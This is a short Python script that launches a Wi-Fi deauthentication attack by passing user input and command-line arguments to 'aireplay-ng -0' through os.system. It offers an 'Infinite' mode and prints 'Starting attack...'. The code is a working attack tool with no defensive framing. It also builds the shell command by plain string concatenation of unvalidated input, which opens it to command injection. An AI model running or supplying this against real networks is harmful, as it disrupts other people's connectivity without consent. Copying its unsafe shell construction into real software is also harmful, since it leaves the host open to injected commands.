import os,sys

if(sys):
    print('Starting attack...')
    times = input('How many times do you want to deauth? (0 - Infinite): ')
    os.system("sudo aireplay-ng -0 " + times + " -a " + sys.argv[1] + " " + sys.argv[2] + " --ignore-negative-one")